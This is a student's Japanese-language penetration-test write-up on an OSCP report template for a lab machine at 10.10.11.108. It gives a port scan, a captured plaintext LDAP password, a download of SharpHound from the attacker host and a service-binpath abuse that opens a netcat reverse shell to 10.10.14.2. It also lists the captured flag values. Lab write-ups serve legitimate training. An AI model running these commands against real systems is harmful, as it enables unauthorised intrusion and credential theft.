2024.6.8

![[Return image 1.png]]

OSCP Penetration Test Report

v.2.0

student@youremailaddress.com

OSID: XXXXX

![[Return image.png]]

Copyright © 2023 OffSec Ltd. All rights reserved.

4\. 自主的な課題

4.1ターゲット#1– 10.10.11.108

![[Return image 2.png]]

4.1.1 初期アクセス –

4.1.2 サービス列挙

![[Return image 3.png]]

ポート スキャン結果

| **IP Address** | **Ports Open** |
| --- | --- |
| 10.10.11.108 | **TCP**: 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 |

53 DNS

![[Return image 4.png]]

80

![[Return image 5.png]]

![[Return image 6.png]]

![[Return image 7.png]]

88 kerberos

![[Return image 8.png]]

139,445

389,636

![[Return image 9.png]]

4.1.2 初期アクセス –

サーバのIPアドレスをkaliに設定する。

![[Return image 10.png]]

netcatのポート389で待ち受けておき、アクセスUpdateを押下するとパスワードが平文で送られてくる。

![[Return image 11.png]]

1edFg43012!!

![[Return image 12.png]]

![[Return image 13.png]]

Local.txt値:628fb6bfb4d0bdc15a21e2394044276f

4.1.3 特権エスカレーション -

![[Return image 14.png]]

![[Return image 15.png]]

Invoke-WebRequest -Uri http://10.10.14.2/SharpHound.exe -UseBasicParsing -OutFile SharpHound.exe

![[Return image 16.png]]

download 20240609070337_BloodHound.zip

![[Return image 17.png]]

node名にreturn(ドメイン)を入力

Shortest Path from Owned Principals

![[Return image 18.png]]

It didn't work

![[Return image 19.png]]

sc.exe config VSS binpath**=**"C:\programdata\nc64.exe -e cmd 10.10.14.2 4444"

![[Return image 20.png]]

![[Return image 21.png]]

type c:\users\administrator\desktop\root.txt

![[Return image 22.png]]

![[Return image 23.png]]

4.1.4 エクスプロイト後の処理

type c:\users\administrator\desktop\root.txt

![[Return image 24.png]]

Proof.txt値:3b19214366beacdd7a53cef11ec1d306